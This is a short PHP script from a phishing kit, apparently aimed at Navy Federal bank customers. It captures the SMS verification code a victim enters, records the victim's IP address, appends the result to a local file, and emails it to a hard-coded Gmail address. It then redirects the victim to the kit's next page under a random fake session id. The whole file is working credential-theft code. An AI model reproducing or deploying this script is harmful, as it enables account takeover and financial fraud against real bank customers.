<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| RESULT Navy sms By JoCk |--------------|\n";
$message .= "|sms : ".$_POST['sms']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
$send = "patrickfoong28@gmail.com";
$subject = "sms Navy By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 
{
mail("$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
	
		

	 	   header("Location: email.php?session_id=$praga$praga");
 ?>





